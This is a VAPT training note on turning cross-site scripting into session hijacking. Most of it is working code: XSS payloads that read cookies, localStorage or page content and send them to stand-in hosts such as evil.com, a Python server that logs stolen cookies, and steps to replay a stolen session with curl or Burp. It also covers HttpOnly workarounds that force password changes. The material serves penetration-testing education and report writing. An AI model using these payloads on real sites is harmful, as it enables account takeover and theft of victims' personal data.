---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.16 XSS to Session Hijacking"
---

# 07.16 — XSS to Session Hijacking

## Overview

Session hijacking via XSS means stealing a victim's session cookie and using it to impersonate them. This is one of the most common and impactful XSS exploitation techniques — and often the one shown in proof-of-concept reports.

```
ATTACK CHAIN:
  1. Find XSS vulnerability
  2. Craft payload that reads document.cookie
  3. Exfiltrate cookies to attacker's server
  4. Use stolen cookie to make requests as the victim
  5. Full account takeover!

PREREQUISITES:
  ✓ XSS vulnerability exists
  ✓ Session cookie is accessible via JS (not HttpOnly)
  ✓ Attacker controls a server to receive the stolen cookie
```

---

## Step 1: Read Cookies

```javascript
// IN BROWSER CONSOLE (testing phase):
document.cookie
// Returns: "session=abc123; csrf_token=xyz; lang=en"

// THE SESSION COOKIE IS WHAT WE WANT:
// session=abc123   ← this authenticates the user!
```

---

## Step 2: Exfiltrate Cookies

### Method 1: Image Request (Most Compatible)

```javascript
// CREATE A NEW IMAGE ELEMENT AND SET SRC:
// Browser automatically makes GET request to load the image
// → GET request carries cookie to attacker's server!

new Image().src = 'https://attacker.com/steal?c=' + document.cookie;

// ALTERNATIVE ONE-LINER:
document.write('<img src="https://attacker.com/steal?c=' + btoa(document.cookie) + '">');
// btoa() = base64 encode (avoids issues with special chars in cookies)
```

### Method 2: Fetch API

```javascript
// MORE MODERN — MORE CONTROL:
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href,
    referrer: document.referrer
  }),
  headers: {'Content-Type': 'application/json'}
});
```

### Method 3: XMLHttpRequest

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie), true);
xhr.send();
```

### Method 4: Location Redirect (Simpler but Disrupts User)

```javascript
// Redirects victim — more noticeable!
document.location = 'https://attacker.com/steal?c=' + document.cookie;
window.location.href = 'https://attacker.com/steal?c=' + document.cookie;
```

---

## Step 3: Set Up the Receiver Server

```python
# SIMPLE PYTHON HTTP SERVER TO RECEIVE COOKIES:
# Run on your VPS:
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import logging

class CookieCatcher(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        if 'c' in params:
            cookie_data = params['c'][0]
            print(f"[+] STOLEN COOKIE from {self.client_address[0]}:")
            print(f"    {cookie_data}")
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"{self.client_address[0]}: {cookie_data}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'')
    
    def log_message(self, format, *args):
        pass  # suppress default logging

HTTPServer(('0.0.0.0', 8080), CookieCatcher).serve_forever()
```

```bash
# EVEN SIMPLER — NETCAT:
nc -lvp 8080
# Cookies arrive as: GET /steal?c=session=abc123 HTTP/1.1

# NGROK (if no VPS):
ngrok http 8080
# Provides public URL to receive exfiltrated cookies
```

---

## Step 4: Use the Stolen Cookie

```bash
# METHOD 1: CURL WITH STOLEN COOKIE:
curl -b "session=STOLEN_SESSION_VALUE" https://target.com/account

# METHOD 2: BROWSER — DEVELOPER TOOLS:
# Open DevTools → Application tab → Cookies
# Add cookie: name=session, value=STOLEN_VALUE, domain=target.com
# Refresh page → now logged in as victim!

# METHOD 3: BURP SUITE:
# Proxy → Intercept → add/replace Cookie header:
Cookie: session=STOLEN_SESSION_VALUE

# METHOD 4: BROWSER EXTENSION (Cookie Editor):
# Cookie-Editor extension → Import/Edit cookies directly
```

---

## Complete XSS Payload Examples

```javascript
// PAYLOAD 1 — SIMPLE IMAGE EXFIL:
<script>new Image().src='https://evil.com/c?d='+document.cookie</script>

// PAYLOAD 2 — BASE64 ENCODED (safer with special chars):
<script>new Image().src='https://evil.com/c?d='+btoa(document.cookie)</script>

// PAYLOAD 3 — FETCH WITH FULL CONTEXT:
<script>
fetch('https://evil.com/steal',{
  method:'POST',
  body:JSON.stringify({
    c:document.cookie,
    u:location.href,
    t:new Date().toISOString()
  }),
  mode:'no-cors'
})
</script>

// PAYLOAD 4 — STORED XSS IN ATTRIBUTE CONTEXT:
"><script>new Image().src='https://evil.com/?c='+document.cookie</script>

// PAYLOAD 5 — MINIFIED FOR TIGHT SPACES:
<svg onload=fetch('//evil.com/?c='+document.cookie)>

// PAYLOAD 6 — WITH CORS BYPASS (mode:no-cors):
<script>fetch('https://evil.com/steal?c='+encodeURIComponent(document.cookie),{mode:'no-cors'})</script>
// mode:'no-cors' = request goes through even if server doesn't send CORS headers
```

---

## What If Cookies Are HttpOnly?

```
HttpOnly cookies CANNOT be read by document.cookie!

BUT — alternatives still allow account takeover:

1. FORGE AUTHENTICATED REQUESTS (CSRF via XSS):
   → Read CSRF token from DOM:
   var csrf = document.querySelector('[name="csrf_token"]').value;
   → Make authenticated API calls using the victim's active session:
   fetch('/api/change-password', {method:'POST', body:'new_password=hacked&csrf='+csrf});
   → XHR/fetch requests AUTOMATICALLY include the victim's HttpOnly cookies!
   (because the request comes from the victim's browser, not attacker's)

2. READ SENSITIVE DATA FROM THE PAGE:
   → Read account details, personal info, credit cards directly from DOM
   var data = document.body.innerHTML;
   fetch('https://evil.com/data', {method:'POST', body:data, mode:'no-cors'});

3. SCREENSHOT THE PAGE:
   → Use html2canvas to capture page contents
   
4. EXFILTRATE LOCALSTORAGE/SESSIONSTORAGE:
   → document.cookie is HttpOnly — localStorage is NOT!
   fetch('https://evil.com/?ls='+btoa(JSON.stringify(localStorage)))

5. CHANGE PASSWORD WITHOUT OLD PASSWORD:
   → Many apps don't require old password for change
   → XSS + CSRF token theft → change password → full account takeover
```

---

## Demonstrating Impact in a Report

```
PROOF OF CONCEPT REPORT SECTION:

STEPS TO REPRODUCE:
1. Browse to https://target.com/profile?name=<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
2. For stored XSS: submit the payload in the [field name], then browse to [URL where it renders]
3. Observe incoming request at https://evil.com/steal with the victim's session cookie

IMPACT:
  The stolen cookie was used to authenticate as the victim at https://target.com.
  Commands executed:
    curl -b "session=STOLEN_COOKIE" https://target.com/account
  Response confirmed access to victim's account details.

SEVERITY: HIGH / CRITICAL
CVSS: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
```

---

## Related Notes
- [[02 - Reflected XSS]] — reflected XSS
- [[03 - Stored XSS]] — stored XSS (highest impact for session theft)
- [[17 - XSS to Account Takeover]] — full account takeover chain
- [[18 - XSS to CSRF]] — making authenticated requests via XSS
- [[Module 10 - Authentication]] — session management
